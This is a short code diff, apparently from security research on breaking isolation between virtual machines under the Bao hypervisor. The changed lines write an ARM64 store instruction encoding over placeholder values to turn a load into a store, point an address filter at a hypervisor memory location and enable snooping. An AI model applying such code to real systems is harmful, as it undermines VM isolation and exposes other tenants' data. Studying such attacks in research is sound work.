@@ -100,13 +100,15 @@ int main() {
     // Data leak between VMs 
     //  - Data addr -> 0x40000000
     
-    *wdata_0 = 0xF1F1F1F1;
-    *wdata_1 = 0xF2F2F2F2;
-    *wdata_2 = 0xF3F3F3F3;
-    *wdata_3 = 0xF4F4F4F4;
+    *wdata_0 = 0xf9000001; // change the ldr to str
+    *wdata_1 = 0xf9000001; // change the ldr to str
+    *wdata_2 = 0xf9000001; // change the ldr to str
+    *wdata_3 = 0xf9000001; // change the ldr to str
     // Address Filter
                     
-    *base_addr  = 0x40000100;
+    // *base_addr  = 0x40000100; 
+    // *base_addr  = 0x20001580; // without bao
+    *base_addr  = 0x038016c0; // with bao
     *mem_size   = 0x4;
     // Snoop Filter
     *acsnoop = 0x1;
